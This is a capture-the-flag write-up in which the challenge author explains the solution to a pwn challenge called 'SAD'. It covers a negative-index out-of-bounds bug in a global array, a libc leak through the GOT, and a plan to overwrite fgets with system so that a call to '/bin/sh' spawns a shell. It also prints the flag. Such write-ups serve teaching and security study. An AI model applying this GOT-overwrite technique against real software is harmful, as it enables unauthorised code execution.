## Challenge Name: SAD
**Category**: Pwn

**Points**: 499

**Solves**: 2

**Challenge Description**: There's a secret agent database (SAD) I
 just got access to, I wonder if there's more we can access beyond the secret agent names...

Given Files:
* [sad](sad)
* [chall.c](chall.c)
* [libc](libc6_2.35-0ubuntu3.6_amd64.so)
* [dynamic linker]()

This was the first challenge I ever wrote for a ctf and I hope the players enjoyed it. Here is my intented solution and it also happens to be my first ever writeups so I apologise in advance if it is unclear.

## Solution
Running the binary we get
```
root@8bbc2ed97cff:/home/sieberr# ./sad
Welcome to the secret agent database (sad)!!!
Someone told me it can be hacked with ease...
--- MENU ---
1. Read a name
2. Change a name
3. Exit
> 1
Agent number: 0
[Agent no. 0]: Alice
--- MENU ---
1. Read a name
2. Change a name
3. Exit
> 2
Agent number: 0
New name: AAAA
[Agent no. 0]: AAAA

--- MENU ---
1. Read a name
2. Change a name
3. Exit
> 3
Bye
```
We can view and edit agent names based off an indexing system. Looking through the source code, we see that agents is an array stored in the .bss section as it is a global array.
```
char agents[][8] = {"Alice","Bob","Craig","David","Eve","Faythe"};
``` 
We can access negative indexes of the agents array as it only checks if the index is smaller than 8, meaning that we can read and write arbitary memory in this program. 
```
    while (1) {
        menu();
        scanf("%d", &choice);
        switch(choice) {
            case 1:
                printf("Agent number: ");
                scanf("%d", &index);
                if (index > (int)(sizeof(agents)/8)-1) {
                    puts("tsk tsk don't be naughty...");
                    exit(1);
                }
                printf("[Agent no. %d]: %s\n",index, agents[index]);
                break;
            case 2:
                printf("Agent number: ");
                scanf("%d", &index);
                if (index > (int)(sizeof(agents)/8)-1) {
                    puts("tsk tsk don't be naughty...");
                    exit(1);
                }
                getchar();
                printf("New name: ");
                fgets(agents[index],8,stdin);
                printf("[Agent no. %d]: %s\n",index, agents[index]);
                break;
            case 3:
                puts("Bye");
                exit(1);
            default:
                puts("Invalid Choice");
        }
```
In addition, the program is complied with no relro so the global offset table(got) is writeable. The got contains entries to functions in libc so that they are linked dynamically when the code runs.
```
//gcc  ./chall.c -Wl,-z,norelro -o sad
```

## Exploit
We can leak the addresses of libc functions in the got to defeat aslr. Examining memory in gdb, we can see that the printf got entry is at `0x555555600f28` and `-11` index of agents.
```
pwndbg> x/20gx 0x555555600f20
0x555555600f20: 0x00007ffff7e13e50      0x00007ffff7df36f0
0x555555600f30: 0x00007ffff7e12380      0x00007ffff7e1aae0
0x555555600f40: 0x00007ffff7df5090      0x00007ffff7dd85f0
0x555555600f50: 0x0000000000000000      0x0000000000000000
0x555555600f60: 0x0000000000000000      0x0000555555600f68
0x555555600f70: 0x0000000000000000      0x0000000000000000
0x555555600f80 <agents>:        0x0000006563696c41      0x0000000000626f42
0x555555600f90 <agents+16>:     0x0000006769617243      0x0000006469766144
0x555555600fa0 <agents+32>:     0x0000000000657645      0x0000656874796146
0x555555600fb0 <stdin@@GLIBC_2.2.5>:    0x00007ffff7fadaa0      0x0000000000000000
pwndbg> got

GOT protection: No RELRO | GOT functions: 6

[0x555555600f20] puts@GLIBC_2.2.5 -> 0x7ffff7e13e50 (puts) ◂— endbr64
[0x555555600f28] printf@GLIBC_2.2.5 -> 0x7ffff7df36f0 (printf) ◂— endbr64
[0x555555600f30] fgets@GLIBC_2.2.5 -> 0x7ffff7e12380 (fgets) ◂— endbr64
[0x555555600f38] getchar@GLIBC_2.2.5 -> 0x7ffff7e1aae0 (getchar) ◂— endbr64
[0x555555600f40] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7df5090 (__isoc99_scanf) ◂— endbr64
[0x555555600f48] exit@GLIBC_2.2.5 -> 0x7ffff7dd85f0 (exit) ◂— endbr64
```
The offset of system from printf is `0xf980` and we can overwrite the the a got entry to point to system in libc. This means that when that function is called, system is actually ran with all the original arguments.
```
pwndbg> x printf-system
0xf980: Cannot access memory at address 0xf980
```
A good victim would be `fgets` as it is called in this way
```
fgets(agents[index],8,stdin);
```
So when the got entry of `fgets` is overwritten to point to `system`. `system` with the first argument being an index of the `agents` array we can control and edit to be `/bin/sh` is called.
```
system(agents[index]);
```
1. Leak the `printf` address by reading -11 index of the `agents` array and calculate the address of `system` (Libc is given)

2. Edit an entry of `agents` array to `/bin/sh` 

3. Edit `fgets` (offset -10) got entry to point to system.

4. Choose to edit the index of `agents` array with `/bin/sh` written to trigger call to `system`


### Flag
sctf{4rr4y_00b5_4r3_d4ng3rou5}
